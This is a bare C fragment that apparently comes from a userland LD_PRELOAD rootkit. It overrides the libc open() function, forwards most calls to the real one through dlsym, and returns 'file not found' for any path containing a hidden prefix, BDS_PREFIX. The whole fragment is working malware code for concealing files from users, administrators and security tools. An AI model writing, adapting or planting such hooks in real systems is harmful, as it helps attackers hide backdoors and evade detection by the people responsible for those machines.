int open(const char *pathname, int flags, mode_t mode) {
	if (!orig_open)
		orig_open = dlsym(RTLD_NEXT,"open");
	if (debug == 1)
		printf("\nopen : %s\n", pathname);
    
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return -1;    
	}
    
	return orig_open(pathname, flags, mode);
}